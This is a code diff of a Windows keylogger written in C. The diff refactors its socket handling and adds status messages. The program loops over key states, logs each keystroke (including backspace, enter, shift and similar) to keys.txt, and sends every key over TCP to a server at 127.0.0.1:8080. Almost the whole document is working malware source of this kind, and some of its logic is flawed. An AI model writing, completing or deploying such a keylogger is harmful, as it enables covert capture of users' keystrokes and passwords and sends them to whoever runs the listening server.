@@ -2,40 +2,40 @@
 #include <stdlib.h>
 #include <string.h>
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <winuser.h>
-#include <ws2tcpip.h>
 
 // this file still needs fixing
 
-void startLogging(struct sockaddr_in *serv_addr, int client_fd);
+void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket);
 void startWinsock(WSADATA *wsaData);
-int startSocket();
-void connectToServer(struct sockaddr_in *serv_addr, int client_fd);
-void sendMsg(int client_fd, const char *msg);
-void closeSocket(int client_fd);
+SOCKET startSocket();
+void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket);
+void sendMsg(SOCKET client_socket, const char *msg);
+void closeSocket(SOCKET client_socket);
 
 int main() {
-    int client_fd;
+    SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(8080);
 
     startWinsock(&wsaData);
-    client_fd = startSocket();
+    client_socket = startSocket();
 
-    startLogging(&serv_addr, client_fd);
+    startLogging(&serv_addr, client_socket);
     return 0;
 }
 
-void startLogging(struct sockaddr_in *serv_addr, int client_fd) {
+void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket) {
     FILE *keysPtr;
     keysPtr = fopen("keys.txt", "w");
     keysPtr = fopen("keys.txt", "a");
-    connectToServer(serv_addr, client_fd);
+    connectToServer(serv_addr, client_socket);
 
-    // closeSocket(client_fd);
+    // closeSocket(client_socket);
     char c;
     while (1) {
         for (c = 0; c < 255; c++) {
@@ -46,31 +46,31 @@ void startLogging(struct sockaddr_in *serv_addr, int client_fd) {
                 if (c == VK_BACK) {
                     text = "[backspace]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_RETURN) {
                     text = "[enter]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_SHIFT) {
                     text = "[shift]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_CONTROL) {
                     text = "[ctrl]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_CAPITAL) {
                     text = "[caps]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_TAB) {
                     text = "[tab]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else if (c == VK_MENU) {
                     text = "[alt]";
                     fprintf(keysPtr, "%s", text);
-                    sendMsg(client_fd, text);
+                    sendMsg(client_socket, text);
                 } else {
                     if (c >= 0x20 && c <= 0x6F){
                         char str[2];
@@ -78,7 +78,7 @@ void startLogging(struct sockaddr_in *serv_addr, int client_fd) {
                         str[1] = '\0';
                         text = str;
                         fprintf(keysPtr, "%s", text);
-                        sendMsg(client_fd, text);
+                        sendMsg(client_socket, text);
                     }
                 }
             }
@@ -93,41 +93,46 @@ void startWinsock(WSADATA *wsaData) {
     }
 }
 
-int startSocket() {
-    int client_fd;
-    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+SOCKET startSocket() {
+    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (client_socket < 0) {
         printf("\n Socket creation error \n");
         WSACleanup();
         exit(EXIT_FAILURE);
+    } else {
+        printf("Socket created. \n");
     }
-    return client_fd;
+    return client_socket;
 }
 
-void connectToServer(struct sockaddr_in *serv_addr, int client_fd) {
+void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket) {
 
     if (inet_pton(AF_INET, "127.0.0.1", &serv_addr->sin_addr) <= 0) {
         printf("\nInvalid address/ Address not supported \n");
-        closesocket(client_fd);
+        closesocket(client_socket);
         WSACleanup();
         exit(EXIT_FAILURE);
-    }
-
-    if (connect(client_fd, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) <
-        0) {
-        printf("\nConnection Failed \n");
-        printf("%i", client_fd);
-        closesocket(client_fd);
+    } else if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
+        printf("\nConnection Failed. \n");
+        printf("%i", client_socket);
+        closesocket(client_socket);
         WSACleanup();
         exit(EXIT_FAILURE);
+    } else{
+        printf("Client connected to server.\n");
     }
 }
 
-void sendMsg(int client_fd, const char *msg) {
-    int sent = send(client_fd, msg, strlen(msg), 0);
-    printf("%s sent, status = %i \n", msg, sent);
+void sendMsg(SOCKET client_socket, const char *msg) {
+    int sent = send(client_socket, msg, strlen(msg), 0);
+    if (sent == -1){
+        printf("Error sending message. The connection must have been cut.\n");
+    } else{
+        printf("%s sent, status = %i \n", msg, sent);
+    }
 }
 
-void closeSocket(int client_fd) {
-    closesocket(client_fd);
+void closeSocket(SOCKET client_socket) {
+    closesocket(client_socket);
     WSACleanup();
 }
